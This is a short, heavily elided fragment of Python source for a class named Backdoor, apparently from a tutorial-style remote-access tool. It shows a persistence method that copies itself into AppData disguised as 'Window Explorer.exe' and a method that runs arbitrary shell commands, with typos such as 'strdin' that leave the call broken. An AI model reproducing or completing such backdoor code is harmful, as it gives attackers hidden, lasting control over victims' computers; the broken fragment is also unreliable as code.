...
# -*- coding: utf-8 -*-
"""
Created on Thu Aug 20 17:18:22 2020
...
class Backdoor:
    ...
    def become_persistent(self):
        evil_file_loaction = os.environ["appdata"] + "\\Window Explorer.exe"
    ...
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell = True, stderr=subprocess.DEVNULL, strdin = subprocess.DEVNULL)
